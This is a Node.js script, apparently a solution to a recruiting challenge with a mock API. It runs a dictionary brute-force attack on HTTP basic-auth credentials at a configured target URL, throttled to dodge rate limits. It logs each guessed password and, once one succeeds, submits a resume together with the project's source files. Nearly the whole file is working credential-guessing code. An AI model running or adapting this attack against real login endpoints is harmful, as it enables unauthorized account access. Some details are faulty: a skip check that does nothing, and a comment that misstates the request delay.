import 'dotenv/config';
import fs from 'fs';
import axios from 'axios';
import Bottleneck from 'bottleneck';
import { submitResume } from './submit.js'

//Config:
const TARGET_URL = process.env.TARGET_API_URL;
const USERNAME = process.env.USERNAME;
const CV_PATH = process.env.RESUME_PATH;

//Define rate limiter:
const limiter = new Bottleneck({ minTime: 105 }); //slow down requests to take longer than 10s to account for any network issues.

//Check Password

async function checkPassword(password) {

    try {
        const response = await axios.get(TARGET_URL, {
            auth: {username: USERNAME, password: password}
        });

        //Success case:
        console.log(`Success, Password is: ${password}`);
        return {success: true, url: response.data.url };

    }catch (error) {
        if (error.response?.status === 401){
            console.log(`Incorrect Password: ${password}`);
        }else if (error.response?.status === 429) {
            console.warn(`RATE LIMIT HIT for ${password}.`);
            return { success: false, retry: true, password: password };
        }else {
            console.error(`Error for ${password}:`, error.message);
        }
        return { success: false };
    }
    
}

//Attack function:
async function startAttack() {
    const passwords = fs.readFileSync('dict.txt', 'utf-8').split('\n');
    console.log(`Trying ${passwords.length} passwords. Target: ${TARGET_URL}`);

    const wrappedCheck = limiter.wrap(checkPassword);
    let successfullURL = null;

    const promises = passwords.map (async (password) => {
        if (!password || successfullURL); //Need to skiup if empty or already used.

        const result = await wrappedCheck(password);

        if (result?.success) successfullURL = result.url;

        if (result?.retry) {
            //Queue the failed request
            wrappedCheck(result.password).then(res => {
                if (res?.success) successfullURL = res.url;
            });
        }
    });

    await Promise.all(promises);

    if (successfullURL) {
        console.log('Attack finished. URL: ', successfullURL);
        const sourceFiles = ['attack.js', 'submit.js', 'generateDict.js', 'package.json', '../README.md', '.env.example', '../mock-api/server.js', '../mock-api/package.json', '../mock-api/.env.example'];
        await submitResume(successfullURL, CV_PATH, sourceFiles, 'dict.txt');
    } else {
        console.log("Attack finished. Password not found.");
    }
}

startAttack();